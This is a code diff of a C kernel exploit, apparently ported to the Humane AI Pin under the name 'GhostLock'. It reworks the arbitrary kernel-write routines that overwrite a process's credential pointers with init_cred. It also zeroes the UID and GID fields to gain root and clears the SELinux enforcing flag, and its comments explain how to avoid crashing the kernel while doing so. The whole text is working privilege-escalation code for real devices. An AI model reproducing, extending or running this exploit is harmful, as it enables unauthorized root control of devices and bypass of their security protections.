@@ -1,3 +1,6 @@
+// SPDX-License-Identifier: Apache-2.0
+// Modified for the GhostLock Humane AI Pin port; see docs/PROVENANCE.md.
+
 #include "common.h"
 #include "reclaim_capture_gate.h"
 #include "perf_reclaim_gate.h"
@@ -19,7 +22,6 @@ atomic_int main_route_delay_usec;
 uint64_t kaslr_base;
 uint64_t kaslr_slide;
 
-#define DIRECT_ROUTE_ATTEMPTS 3
 #define DIRECT_READ_ATTEMPTS 10
 #define DIRECT_EFFECT_ATTEMPTS 10
 
@@ -344,73 +346,36 @@ static int direct_read_shape0_exact64_once(
   return DIRECT_R64_OK;
 }
 
-static int direct_trigger_write64(
-    const char *name, uintptr_t target, uintptr_t value,
-    int shape, int *write_idx) {
-  for (int attempt = 1; attempt <= DIRECT_ROUTE_ATTEMPTS; attempt++) {
-    int idx = (*write_idx)++;
-    pr_success("direct-step %s attempt=%d/%d target=%016zx value=%016zx\n",
-               name, attempt, DIRECT_ROUTE_ATTEMPTS, target, value);
-    if (direct_pselect_write_once(target, value, shape, idx)) {
-      return 1;
-    }
-  }
-  return 0;
-}
-
 static int direct_read_enforcing(void);
 
-static int direct_trigger_write64_followup(
+static int direct_trigger_write64_repaired(
     const char *name, uintptr_t target, uintptr_t value, int shape,
-    uintptr_t followup_target, int *write_idx) {
+    uintptr_t repair_target, uintptr_t selinux_target, int *write_idx) {
   for (int attempt = 1; attempt <= DIRECT_EFFECT_ATTEMPTS; attempt++) {
     int idx = (*write_idx)++;
-    int followup_idx = *write_idx;
+    int repair_idx = *write_idx;
     *write_idx += DIRECT_FOLLOWUP_ATTEMPTS;
+    int selinux_idx = *write_idx;
+    if (selinux_target) {
+      *write_idx += DIRECT_FOLLOWUP_ATTEMPTS;
+    }
     pr_success("direct-step %s attempt=%d/%d target=%016zx value=%016zx "
-               "followup=%016zx\n",
+               "repair=%016zx selinux=%016zx\n",
                name, attempt, DIRECT_EFFECT_ATTEMPTS, target, value,
-               followup_target);
-    int route_ok = direct_pselect_write_followup_once(
-        target, value, shape, idx, followup_target, followup_idx);
+               repair_target, selinux_target);
+    int route_ok = direct_pselect_write_repaired_once(
+        target, value, shape, idx, repair_target, repair_idx,
+        selinux_target, selinux_idx);
     int enforcing_now = direct_read_enforcing();
     uid_t uid_now = getuid();
-    pr_success("direct-effect %s attempt=%d/%d route=%d uid=%u euid=%u "
-               "selinux=%d\n",
+    pr_success("direct-repaired-effect %s attempt=%d/%d route=%d uid=%u "
+               "euid=%u gid=%u egid=%u selinux=%d\n",
                name, attempt, DIRECT_EFFECT_ATTEMPTS, route_ok, uid_now,
-               geteuid(), enforcing_now);
-    if (route_ok && enforcing_now == 0 && uid_now != 2000) {
+               geteuid(), getgid(), getegid(), enforcing_now);
+    if (route_ok) {
       return 1;
     }
   }
-  return 0;
-}
-
-static int direct_trigger_write64_until_routed(
-    const char *name, uintptr_t target, uintptr_t value, int shape,
-    int *write_idx) {
-  /*
-   * A successful child already proves the pselect consumer ran over a
-   * perf-verified same-PFN reclaim.  Retry only route misses: repeating an
-   * already successful kernel write adds no information and multiplies the
-   * chance of hitting an unrelated rt-mutex failure.
-   */
-  for (int attempt = 1; attempt <= DIRECT_EFFECT_ATTEMPTS; attempt++) {
-    pr_success("direct-until-routed %s attempt=%d/%d target=%016zx "
-               "value=%016zx\n",
-               name, attempt, DIRECT_EFFECT_ATTEMPTS, target, value);
-    if (direct_trigger_write64(name, target, value, shape, write_idx)) {
-      pr_success("direct-until-routed-result %s routed=1 attempt=%d/%d "
-                 "uid=%u euid=%u selinux=%d\n",
-                 name, attempt, DIRECT_EFFECT_ATTEMPTS, getuid(), geteuid(),
-                 direct_read_enforcing());
-      return 1;
-    }
-  }
-  pr_success("direct-until-routed-result %s routed=0 attempts=%d uid=%u "
-             "euid=%u selinux=%d\n",
-             name, DIRECT_EFFECT_ATTEMPTS, getuid(), geteuid(),
-             direct_read_enforcing());
   return 0;
 }
 
@@ -638,8 +603,10 @@ static int run_direct_root_stage(void) {
   pr_success("direct-step before_init_cred uid=%u pid=%d task=%016llx\n",
              getuid(), getpid(), (unsigned long long)task);
 
-  if (!direct_trigger_write64_until_routed(
-          "install_real_cred", real_cred_slot, init_cred, 1, &write_idx)) {
+  uintptr_t init_cred_id_fields = init_cred + 4;
+  if (!direct_trigger_write64_repaired(
+          "install_real_cred", real_cred_slot, init_cred, 1,
+          init_cred_id_fields, 0, &write_idx)) {
     pr_error("direct real_cred install routes exhausted\n");
     return 0;
   }
@@ -649,41 +616,31 @@ static int run_direct_root_stage(void) {
     return 0;
   }
   uintptr_t selinux_target = canon_addr(SELINUX_ENFORCING);
-  if (!direct_trigger_write64_followup(
+  if (!direct_trigger_write64_repaired(
           "install_cred_then_selinux_zero", cred_slot, init_cred, 1,
-          selinux_target, &write_idx)) {
+          init_cred_id_fields, selinux_target, &write_idx)) {
     pr_error("direct cred install failed\n");
     return 0;
   }
 
   /*
-   * S4d2 repair (single write; fleet/code-review.md B1+M2): the two
-   * shape-1 installs collateral-write (task+slot-8)|color into
-   * init_cred[0], corrupting usage AND uid/gid.  A childless shape-1
-   * write (right=left=0 -> leaf rb_erase, no collateral) at
-   * init_cred+4 zeroes uid/gid/suid/sgid while LEAVING usage as the
-   * odd nonzero collateral value: atomic_dec_and_test can only free
-   * init_cred at exactly 0, which an odd garbage count never reaches.
-   * (Zeroing init_cred+0 instead would leave usage=0: one fork/exit
-   * pair -> put_cred_rcu frees the static init_cred.  A repair at
-   * init_cred-8 zeroes init_groups instead — both are wrong.)
+   * Each shape-1 credential install collateral-writes
+   * (task+slot-8)|color into init_cred[0], corrupting usage and the first
+   * ID fields.  Its supervised child must therefore complete a childless
+   * shape-1 repair at init_cred+4 before it may return success or proceed to
+   * the SELinux follow-up.  That repair zeroes uid/gid/suid/sgid while
+   * leaving usage as the odd nonzero collateral value; atomic_dec_and_test
+   * can only free init_cred at exactly zero.  Zeroing init_cred+0 would make
+   * a later put_cred_rcu free the static credential object.
    */
-  int repair_ok = 0;
-  for (int attempt = 1; attempt <= DIRECT_EFFECT_ATTEMPTS; attempt++) {
-    int route_ok = direct_trigger_write64(
-        "repair_init_cred", init_cred + 4, 0, 1, &write_idx);
-    repair_ok = getuid() == 0 && geteuid() == 0 &&
-                getgid() == 0 && getegid() == 0;
-    pr_success("direct-effect repair_init_cred attempt=%d/%d route=%d "
-               "uid=%u euid=%u gid=%u egid=%u repaired=%d\n",
-               attempt, DIRECT_EFFECT_ATTEMPTS, route_ok,
-               getuid(), geteuid(), getgid(), getegid(), repair_ok);
-    if (route_ok && repair_ok) {
-      break;
-    }
-  }
+  int repair_ok = getuid() == 0 && geteuid() == 0 &&
+                  getgid() == 0 && getegid() == 0;
   if (!repair_ok) {
-    pr_error("direct init_cred repair exhausted without zero IDs\n");
+    pr_error("direct paired init_cred repair did not produce zero IDs\n");
+    return 0;
+  }
+  if (direct_read_enforcing() != 0) {
+    pr_error("direct paired SELinux follow-up did not clear enforcing\n");
     return 0;
   }
 
